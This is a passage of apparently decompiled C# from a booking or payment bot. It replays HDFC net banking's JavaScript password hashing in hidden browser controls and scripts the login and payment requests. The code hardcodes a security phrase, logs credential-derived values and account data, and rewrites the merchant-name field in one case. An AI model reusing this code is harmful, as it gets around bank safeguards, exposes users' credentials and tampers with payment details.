(0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);\n\tpc2bytes2 = new Array (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);\n\tpc2bytes3 = new Array (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);\n\tpc2bytes4 = new Array (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);\n\tpc2bytes5 = new Array (0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);\n\tpc2bytes6 = new Array (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);\n\tpc2bytes7 = new Array (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);\n\tpc2bytes8 = new Array (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);\n\tpc2bytes9 = new Array (0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);\n\tpc2bytes10 = new Array (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);\n\tpc2bytes11 = new Array (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);\n\tpc2bytes12 = new Array (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);\n\tpc2bytes13 = new Array (0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);\n\t//how many iterations (1 for des, 3 for triple des)\n\tvar iterations = key.length > 8 ? 3 : 1; //changed by Paul 16/6/2007 to use Triple DES for 9+ byte keys\n\t//stores the return keys\n\tvar keys = new Array (32 * iterations);\n\t//now define the left shifts which need to be done\n\tvar shifts = new Array (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0);\n\t//other variables\n\tvar lefttemp, righttemp, m=0, n=0, temp;\n\tfor (var j=0; j<iterations; j++) { //either 1 or 3 iterations\n\tleft = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\tright = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 2) ^ right) & 0x33333333; right ^= temp; left ^= (temp << 2);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\t//the right side needs to be shifted and to get the last four bits of the left side\n\ttemp = (left << 8) | ((right >>> 20) & 0x000000f0);\n\t//left needs to be put upside down\n\tleft = (right << 24) | ((right << 8) & 0xff0000) | ((right >>> 8) & 0xff00) | ((right >>> 24) & 0xf0);\n\tright = temp;\n\t//now go through and perform these shifts on the left and right keys\n\tfor (var i=0; i < shifts.length; i++) {\n\t//shift the keys either one or two bits to the left\n\tif (shifts[i]) {left = (left << 2) | (left >>> 26); right = (right << 2) | (right >>> 26);}\n\telse {left = (left << 1) | (left >>> 27); right = (right << 1) | (right >>> 27);}\n\tleft &= -0xf; right &= -0xf;\n\t//now apply PC-2, in such a way that E is easier when encrypting or decrypting\n\t//this conversion will look like PC-2 except only the last 6 bits of each byte are used\n\t//rather than 48 consecutive bits and the order of lines will be according to\n\t//how the S selection functions will be applied: S2, S4, S6, S8, S1, S3, S5, S7\n\tlefttemp = pc2bytes0[left >>> 28] | pc2bytes1[(left >>> 24) & 0xf]\n\t| pc2bytes2[(left >>> 20) & 0xf] | pc2bytes3[(left >>> 16) & 0xf]\n\t| pc2bytes4[(left >>> 12) & 0xf] | pc2bytes5[(left >>> 8) & 0xf]\n\t| pc2bytes6[(left >>> 4) & 0xf];\n\trighttemp = pc2bytes7[right >>> 28] | pc2bytes8[(right >>> 24) & 0xf]\n\t| pc2bytes9[(right >>> 20) & 0xf] | pc2bytes10[(right >>> 16) & 0xf]\n\t| pc2bytes11[(right >>> 12) & 0xf] | pc2bytes12[(right >>> 8) & 0xf]\n\t| pc2bytes13[(right >>> 4) & 0xf];\n\ttemp = ((righttemp >>> 16) ^ lefttemp) & 0x0000ffff;\n\tkeys[n++] = lefttemp ^ temp; keys[n++] = righttemp ^ (temp << 16);\n\t}\n\t} //for each iterations\n\t//return the keys we've created\n\treturn keys;\n\t} //end of des_createKeys\n\t////////////////////////////// TEST //////////////////////////////\n\tfunction stringToHex (s) {\n\tvar r = \"0x\";\n\tvar hexes = new Array (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\n\tfor (var i=0; i<s.length; i++) {r += hexes [s.charCodeAt(i) >> 4] + hexes [s.charCodeAt(i) & 0xf];}\n\treturn r;\n\t}\n\tfunction hexToString (h) {\n\tvar r = \"\";\n\tfor (var i= (h.substr(0, 2)==\"0x\")?2:0; i<h.length; i+=2) {r += String.fromCharCode (parseInt (h.substr (i, 2), 16));}\n\treturn r;\n\t}\n\t//-----------------------------------------------------------------------------------------------------\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                                    WebBrowser webBrowser = new WebBrowser();
                                    webBrowser.Navigate("about:blank");
                                    webBrowser.Document.Write(text16);
                                    string text17 = webBrowser.Document.InvokeScript("des", new object[4]
                                    {
                                        text2.Substring(0, 8),
                                        text2,
                                        1,
                                        0
                                    }).ToString();
                                    string text18 = webBrowser.Document.InvokeScript("stringToHex", new object[1] { text17 }).ToString();
                                    text18 = text18.ToUpper().Substring(2);
                                    while (text18.Length < 32)
                                    {
                                        text18 += "0";
                                    }
                                    webBrowser.Dispose();
                                    string text19 = "<html>\n<head>\n<script type=\"text/javascript\">\n/*\n\t* jssha256 version 0.1 - Copyright 2006 B. Poettering\n\t*\n\t* This program is free software; you can redistribute it and/or\n\t* modify it under the terms of the GNU General Public License as\n\t* published by the Free Software Foundation; either version 2 of the\n\t* License, or (at your option) any later version.\n\t*\n\t* This program is distributed in the hope that it will be useful,\n\t* but WITHOUT ANY WARRANTY; without even the implied warranty of\n\t* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\n\t* General Public License for more details.\n\t*\n\t* You should have received a copy of the GNU General Public License\n\t* along with this program; if not, write to the Free Software\n\t* Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA\n\t* 02111-1307 USA\n\t*/\n\t/*\n\t* http://point-at-infinity.org/jssha256/\n\t*\n\t\n\t* This is a JavaScript implementation of the SHA256 secure hash function\n\t* and the HMAC-SHA256 message authentication code (MAC).\n\t*\n\t* The routines' well-functioning has been verified with the test vectors\n\t* given in FIPS-180-2, Appendix B and IETF RFC 4231. The HMAC algorithm\n\t* conforms to IETF RFC 2104.\n\t*\n\t* The following code example computes the hash value of the string \"abc\".\n\t*\n\t* SHA256_init();\n\t* SHA256_write(\"abc\");\n\t* digest = SHA256_finalize();\n\t* digest_hex = array_to_hex_string(digest);\n\t*\n\t* Get the same result by calling the shortcut function SHA256_hash:\n\t*\n\t* digest_hex = SHA256_hash(\"abc\");\n\t*\n\t* In the following example the calculation of the HMAC of the string \"abc\"\n\t* using the key \"secret key\" is shown:\n\t*\n\t* HMAC_SHA256_init(\"secret key\");\n\t* HMAC_SHA256_write(\"abc\");\n\t* mac = HMAC_SHA256_finalize();\n\t* mac_hex = array_to_hex_string(mac);\n\t*\n\t* Again, the same can be done more conveniently:\n\t*\n\t* mac_hex = HMAC_SHA256_MAC(\"secret key\", \"abc\");\n\t*\n\t* Note that the internal state of the hash function is held in global\n\t* variables. Therefore one hash value calculation has to be completed\n\t* before the next is begun. The same applies the the HMAC routines.\n\t*\n\t* Report bugs to: jssha256 AT point-at-infinity.org\n\t*\n\t*/\n\t/******************************************************************************/\n\t/* Two all purpose helper functions follow */\n\t/* string_to_array: convert a string to a character (byte) array */\n\tfunction string_to_array(str) {\n\tvar len = str.length;\n\tvar res = new Array(len);\n\tfor(var i = 0; i < len; i++)\n\tres[i] = str.charCodeAt(i);\n\treturn res;\n\t}\n\t/* array_to_hex_string: convert a byte array to a hexadecimal string */\n\tfunction array_to_hex_string(ary) {\n\tvar res = \"\";\n\tfor(var i = 0; i < ary.length; i++)\n\tres += SHA256_hexchars[ary[i] >> 4] + SHA256_hexchars[ary[i] & 0x0f];\n\treturn res;\n\t}\n\t/******************************************************************************/\n\t/* The following are the SHA256 routines */\n\t/*\n\tSHA256_init: initialize the internal state of the hash function. Call this\n\tfunction before calling the SHA256_write function.\n\t*/\n\t\n\tfunction SHA256_init() {\n\tSHA256_H = new Array(0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,\n\t0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19);\n\tSHA256_buf = new Array();\n\tSHA256_len = 0;\n\t}\n\t/*\n\tSHA256_write: add a message fragment to the hash function's internal state.\n\t'msg' may be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction SHA256_write(msg) {\n\tif (typeof(msg) == \"string\")\n\tSHA256_buf = SHA256_buf.concat(string_to_array(msg));\n\telse\n\tSHA256_buf = SHA256_buf.concat(msg);\n\tfor(var i = 0; i + 64 <= SHA256_buf.length; i += 64)\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf.slice(i, i + 64));\n\tSHA256_buf = SHA256_buf.slice(i);\n\tSHA256_len += msg.length;\n\t}\n\t/*\n\tSHA256_finalize: finalize the hash value calculation. Call this function\n\tafter the last call to SHA256_write. An array of 32 bytes (= 256 bits)\n\tis returned.\n\t*/\n\tfunction SHA256_finalize() {\n\tSHA256_buf[SHA256_buf.length] = 0x80;\n\tif (SHA256_buf.length > 64 - 8) {\n\tfor(var i = SHA256_buf.length; i < 64; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tSHA256_buf.length = 0;\n\t}\n\tfor(var i = SHA256_buf.length; i < 64 - 5; i++)\n\tSHA256_buf[i] = 0;\n\tSHA256_buf[59] = (SHA256_len >>> 29) & 0xff;\n\tSHA256_buf[60] = (SHA256_len >>> 21) & 0xff;\n\tSHA256_buf[61] = (SHA256_len >>> 13) & 0xff;\n\tSHA256_buf[62] = (SHA256_len >>> 5) & 0xff;\n\tSHA256_buf[63] = (SHA256_len << 3) & 0xff;\n\tSHA256_Hash_Byte_Block(SHA256_H, SHA256_buf);\n\tvar res = new Array(32);\n\tfor(var i = 0; i < 8; i++) {\n\tres[4 * i + 0] = SHA256_H[i] >>> 24;\n\tres[4 * i + 1] = (SHA256_H[i] >> 16) & 0xff;\n\tres[4 * i + 2] = (SHA256_H[i] >> 8) & 0xff;\n\tres[4 * i + 3] = SHA256_H[i] & 0xff;\n\t}\n\tdelete SHA256_H;\n\tdelete SHA256_buf;\n\tdelete SHA256_len;\n\treturn res;\n\t}\n\t/*\n\tSHA256_hash: calculate the hash value of the string or byte array 'msg'\n\tand return it as hexadecimal string. This shortcut function may be more\n\tconvenient than calling SHA256_init, SHA256_write, SHA256_finalize\n\tand array_to_hex_string explicitly.\n\t*/\n\tfunction SHA256_hash(msg) {\n\tvar res;\n\tSHA256_init();\n\tSHA256_write(msg);\n\tres = SHA256_finalize();\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following are the HMAC-SHA256 routines */\n\t/*\n\tHMAC_SHA256_init: initialize the MAC's internal state. The MAC key 'key'\n\tmay be given as string or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_init(key) {\n\tif (typeof(key) == \"string\")\n\tHMAC_SHA256_key = string_to_array(key);\n\telse\n\tHMAC_SHA256_key = new Array().concat(key);\n\tif (HMAC_SHA256_key.length > 64) {\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tHMAC_SHA256_key = SHA256_finalize();\n\t}\n\tfor(var i = HMAC_SHA256_key.length; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\t}\n\t/*\n\tHMAC_SHA256_write: process a message fragment. 'msg' may be given as\n\tstring or as byte array and may have arbitrary length.\n\t*/\n\tfunction HMAC_SHA256_write(msg) {\n\tSHA256_write(msg);\n\t}\n\t/*\n\tHMAC_SHA256_finalize: finalize the HMAC calculation. An array of 32 bytes\n\t(= 256 bits) is returned.\n\t*/\n\tfunction HMAC_SHA256_finalize() {\n\tvar md = SHA256_finalize();\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] ^= 0x36 ^ 0x5c;\n\tSHA256_init();\n\tSHA256_write(HMAC_SHA256_key);\n\tSHA256_write(md);\n\tfor(var i = 0; i < 64; i++)\n\tHMAC_SHA256_key[i] = 0;\n\tdelete HMAC_SHA256_key;\n\treturn SHA256_finalize();\n\t}\n\t/*\n\tHMAC_SHA256_MAC: calculate the HMAC value of message 'msg' under key 'key'\n\t(both may be of type string or byte array); return the MAC as hexadecimal\n\tstring. This shortcut function may be more convenient than calling\n\tHMAC_SHA256_init, HMAC_SHA256_write, HMAC_SHA256_finalize and\n\tarray_to_hex_string explicitly.\n\t*/\n\tfunction HMAC_SHA256_MAC(key, msg) {\n\tvar res;\n\tHMAC_SHA256_init(key);\n\tHMAC_SHA256_write(msg);\n\tres = HMAC_SHA256_finalize()\n\treturn array_to_hex_string(res);\n\t}\n\t/******************************************************************************/\n\t/* The following lookup tables and functions are for internal use only! */\n\tSHA256_hexchars = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n\t'a', 'b', 'c', 'd', 'e', 'f');\n\tSHA256_K = new Array(\n\t0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,\n\t0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,\n\t0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,\n\t0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n\t0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,\n\t0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,\n\t0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,\n\t0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n\t0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,\n\t0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,\n\t0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2\n\t);\n\tfunction SHA256_sigma0(x) {\n\treturn ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);\n\t}\n\tfunction SHA256_sigma1(x) {\n\treturn ((x >>> 17) | (x << 15)) ^ ((x >>> 19) | (x << 13)) ^ (x >>> 10);\n\t}\n\tfunction SHA256_Sigma0(x) {\n\t\n\treturn ((x >>> 2) | (x << 30)) ^ ((x >>> 13) | (x << 19)) ^\n\t((x >>> 22) | (x << 10));\n\t}\n\tfunction SHA256_Sigma1(x) {\n\treturn ((x >>> 6) | (x << 26)) ^ ((x >>> 11) | (x << 21)) ^\n\t((x >>> 25) | (x << 7));\n\t}\n\tfunction SHA256_Ch(x, y, z) {\n\treturn z ^ (x & (y ^ z));\n\t}\n\tfunction SHA256_Maj(x, y, z) {\n\treturn (x & y) ^ (z & (x ^ y));\n\t}\n\tfunction SHA256_Hash_Word_Block(H, W) {\n\tfor(var i = 16; i < 64; i++)\n\tW[i] = (SHA256_sigma1(W[i - 2]) + W[i - 7] +\n\tSHA256_sigma0(W[i - 15]) + W[i - 16]) & 0xffffffff;\n\tvar state = new Array().concat(H);\n\tfor(var i = 0; i < 64; i++) {\n\tvar T1 = state[7] + SHA256_Sigma1(state[4]) +\n\tSHA256_Ch(state[4], state[5], state[6]) + SHA256_K[i] + W[i];\n\tvar T2 = SHA256_Sigma0(state[0]) + SHA256_Maj(state[0], state[1], state[2]);\n\tstate.pop();\n\tstate.unshift((T1 + T2) & 0xffffffff);\n\tstate[4] = (state[4] + T1) & 0xffffffff;\n\t}\n\tfor(var i = 0; i < 8; i++)\n\tH[i] = (H[i] + state[i]) & 0xffffffff;\n\t}\n\t\n\tfunction SHA256_Hash_Byte_Block(H, w) {\n\tvar W = new Array(16);\n\tfor(var i = 0; i < 16; i++)\n\tW[i] = w[4 * i + 0] << 24 | w[4 * i + 1] << 16 |\n\tw[4 * i + 2] << 8 | w[4 * i + 3];\n\tSHA256_Hash_Word_Block(H, W);\n\t}\n\t/*\n\tPreparing a genric function to be used for generating HMAC_SHA256_MAC.\n\t*/\n\tfunction hex_hmac(key, data)\n\t{\n\treturn HMAC_SHA256_MAC(key, data);\n\t}\n\t\n</script>\n\n<script>\n\nfunction random()\n\t{\n\tvar Pass= Math.floor(10000000 + (Math.random() * (100000000 - 10000000 + 1))); \n\treturn Pass;\n\n}\n\t</script>\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
                                    WebBrowser webBrowser2 = new WebBrowser();
                                    webBrowser2.Navigate("about:blank");
                                    webBrowser2.Document.Write(text19);
                                    string_95 = Conversions.ToString(webBrowser2.Document.InvokeScript("random"));
                                    text15 = webBrowser2.Document.InvokeScript("hex_hmac", new object[2] { string_95, text18 }).ToString();
                                    webBrowser2.Dispose();
                                    text5 = "fldUserAuth=AUTH&fldAppId=XT&fldTxnId=LGN&fldScrnSeqNbr=12&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldLoginUserId=" + text + "&fldSessionId=&fldDeviceTokenFSO=&fldDevicePrint=" + HttpUtility.UrlEncode(str4) + "&fldTptCustomer=&fldRsaEnrollRequired=N&fldRsaUserStatus=A&fldRsaImageId=image_14140&fldRsaImageHeight=100&fldRsaImageWidth=100&fldRsaImagePath=https%3A%2F%2Fwww.services.cyota.co.uk%2Fgeneric%2Fimages%2Fefamily%2Fstu%2FHouseHome%2F020624_1572_1430_lstpRS.jpg&fldRsaImageText=HouseHome-020624_1572_1430_lstpRS&fldRsaUserPhrase=cupplate&fldUserPhrase=cupplate&OrgReqDate=" + HttpUtility.UrlEncode(str) + "&fldEpiReqId=" + text7 + "&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldClientAccNum=&fldAccReqFlag=N&fldMerchRefNbr=" + text9 + "&fldSucStatFlg=N&fldFailStatFlg=N&fldDatTimeTxn=" + HttpUtility.UrlEncode(text10) + "&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldRef1=&fldRef2=&fldRef3=&fldRef4=&fldRef5=&fldRef6=&fldRef7=&fldRef8=&fldRef9=&fldRef10=&fldRef11=&fldDate1=&fldDate2=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldDisplayDetails=&fldDetails1=&fldDetails2=&fldDetails3=&fldCheckSum=" + text13 + "&fldRandomNumber=" + string_95 + "&fldCustId=" + text + "&fldPassword=" + text15 + "&chkrsastu=on";
                                    string_91 = string_92;
                                    string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                    clsMain.Lock("Third Hit : Inp = " + text5);
                                    if (updateTStatus_1 != null)
                                    {
                                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(3/8)", tCntrlName_, null, null);
                                    }
                                    if (_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                    {
                                        clsMain.Lock("Third Hit Output = " + string_94);
                                        if (!string_94.Contains("Menu"))
                                        {
                                            if (string_94.Contains("errormessage='"))
                                            {
                                                startIndex = string_94.IndexOf("errormessage='");
                                                startIndex = string_94.IndexOf("'", startIndex) + 1;
                                                length = string_94.IndexOf("'", startIndex) - startIndex;
                                                string_90 = string_94.Substring(startIndex, length).Trim();
                                                if (string_90.Contains("16001"))
                                                {
                                                    string_90 = "You are not registered for NetBanking.";
                                                }
                                                if (string_90.IndexOf("last session was terminated incorrectly", StringComparison.CurrentCultureIgnoreCase) >= 0 && num2 < 7)
                                                {
                                                    Thread.Sleep(300);
                                                    continue;
                                                }
                                            }
                                            if (string.IsNullOrEmpty(string_90) && string_94.Contains("frmResetPassword"))
                                            {
                                                string_90 = "HDFC: Please Reset your Login Password";
                                            }
                                            if (string.IsNullOrEmpty(string_90))
                                            {
                                                string_90 = "Failed while Login into HDFC";
                                            }
                                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                                            return false;
                                        }
                                        text3 = clsPostData.smethod_7("", string_94, "input", "fldSessionId");
                                        text4 = clsPostData.smethod_7("", string_94, "input", "fldRequestId");
                                        startIndex = string_94.IndexOf("name=\"fldSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text20 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRequestId", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text21 = string_94.Substring(startIndex, length).Trim();
                                        text5 = "fldUserAuth=LIST&fldRsaAuthReq=Y&OrgReqDate=&fldEpiReqId=" + text7 + "&fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=05&fldLangId=eng&fldDeviceId=01&fldWebServerId=YG&fldAppServerId=ZZ&fldLoginUserId=" + text + "&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&customername=&datlastsuccesslogin=&datcurrentlogin=&fldRsaEnrollRequired=N&fldRsaUserStatus=A&fldRsaCollectionRequired=&fldRsaActivityFlag=&fldRsaCollectionType=&fldRsaAuthTxnId=&fldImageId=image_14140&fldImageHeight=100&fldImageWidth=100&fldImagePath=https%3A%2F%2Fwww.services.cyota.co.uk%2Fgeneric%2Fimages%2Fefamily%2Fstu%2FHouseHome%2F020624_1572_1430_lstpRS.jpg&fldImageAltText=HouseHome-020624_1572_1430_lstpRS&fldUserPhrase=cupplate&fldActionType=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldCheckSum=" + text13;
                                        clsMain.Lock("Fourth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(4/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Fourth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                            break;
                                        }
                                        clsMain.Lock("Fourth Hit Output = " + string_94);
                                        if (!string_94.Contains("You have requested for an electronic payment"))
                                        {
                                            string_90 = "Failed while Processing into HDFC after Login";
                                            clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                                            break;
                                        }
                                        startIndex = string_94.IndexOf("name=\"fldSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text20 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRequestId", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text21 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldCodOrgBrn", startIndex);
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text22 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("accounts") + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string str5 = string_94.Substring(startIndex, length);
                                        startIndex = string_94.IndexOf("balance", startIndex) + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text23 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("branch", startIndex) + 5;
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text24 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("mercName", startIndex) + 5;
                                        startIndex = string_94.IndexOf("'", startIndex) + 1;
                                        length = string_94.IndexOf("'", startIndex) - startIndex;
                                        string text25 = string_94.Substring(startIndex, length).Trim();
                                        text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldCodOrgBrn=" + text22 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldBalList=" + text23 + "%7E%3A%3A%7E&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&fldCcyList=INR%7E%3A%3A%7E&urlChallanDtl=&fldClientCode=" + text8 + "&fldMerchCode=" + text6 + "&fldMerchRefNo=" + text9 + "&fldMerchName=IRCTC_NEW&fldTxnCurr=INR&fldTxnAmt=" + text11 + "&fldTxnScAmt=" + text12 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldRsaTxnType=&fldRsaAuthReq=N&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldAdditionalFields=&fldDevicePrint=" + HttpUtility.UrlEncode(str4);
                                        if (!string.IsNullOrEmpty(value) && text5.Contains("PAYTMIRCTCEC"))
                                        {
                                            text5 = clsPostData.SetPost(text5, "fldMerchName", "CCAFREECHARGEIN");
                                        }
                                        clsMain.Lock("Fifth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(5/8)", tCntrlName_, null, null);
                                        }
                                        if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, false, true, num, num, ref string_94, ref string_93, ref webException_0))
                                        {
                                            clsMain.Lock("Fifth Hit Failed. err = " + string_93);
                                            string_90 = "Failed while making Payment. Payment Not Done";
                                            break;
                                        }
                                        clsMain.Lock("Fifth Hit Output = " + string_94);
                                        startIndex = string_94.IndexOf("name=\"fldRequestId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        text21 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldExtSessionId");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text26 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                        startIndex = string_94.LastIndexOf("<", startIndex);
                                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text27 = string_94.Substring(startIndex, length).Trim();
                                        startIndex = string_94.IndexOf("l_rsaTxnId");
                                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                                        string text28 = string_94.Substring(startIndex, length).Trim();
